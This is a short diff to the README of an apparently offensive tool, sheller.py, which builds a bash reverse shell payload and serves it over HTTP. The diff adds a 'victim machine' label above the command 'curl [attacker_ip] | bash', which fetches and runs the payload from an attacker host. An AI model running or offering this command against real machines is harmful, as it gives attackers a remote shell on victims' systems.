@@ -25,7 +25,7 @@ optional arguments:
   --httpport HTTPPORT  Port to start HTTP server in, default 80
   ```
   
-  example:
+  ## Example:
 
   ```
   sudo python3 sheller.py -l bash -p 8080 --httpserver -i eth4
@@ -38,7 +38,8 @@ optional arguments:
   ```
 
   and serves it on http-server at all interfaces on port 80 at / http://localhost
-
+  
+  on victim machine:
   ```
   curl [attacker_ip] | bash
   ```
